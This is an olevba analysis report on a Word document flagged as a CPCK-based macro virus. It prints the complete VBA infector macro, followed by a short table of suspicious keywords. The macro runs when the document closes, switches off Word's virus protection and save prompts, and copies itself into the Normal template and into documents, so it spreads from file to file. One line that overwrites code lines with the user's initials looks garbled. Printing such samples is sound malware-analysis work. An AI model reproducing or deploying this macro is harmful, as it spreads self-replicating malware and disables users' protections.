olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-db1ed8537f8f32723dd51a1b406228122979ca2a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-db1ed8537f8f32723dd51a1b406228122979ca2a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

On Error Resume Next

MC58 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.SaveNormalPrompt = 0

HI75 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.VirusProtection = 0

Application.EnableCancelKey = 0

Options.ConfirmConversions = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set UB83 = ActiveDocument.VBProject.VBComponents.Item(1)

GB15 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set UB83 = NormalTemplate.VBProject.VBComponents.Item(1)

RM88 = True

End If

If RM88 <> True And GB15 <> True Then GoTo PU92

If RM88 = True Then UB83.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HI75 - 1))

If GB15 = True Then UB83.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MC58 - 1))

With UB83.CodeModule

For x = 2 To (UB83.CodeModule.CountOfLines - 1) Step 2

.replaceline x, "'" & Application.UserInitials & Application.ActiveWindowApplication.UserInitials & Application.ActiveWindow

Next x

End With

PU92:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

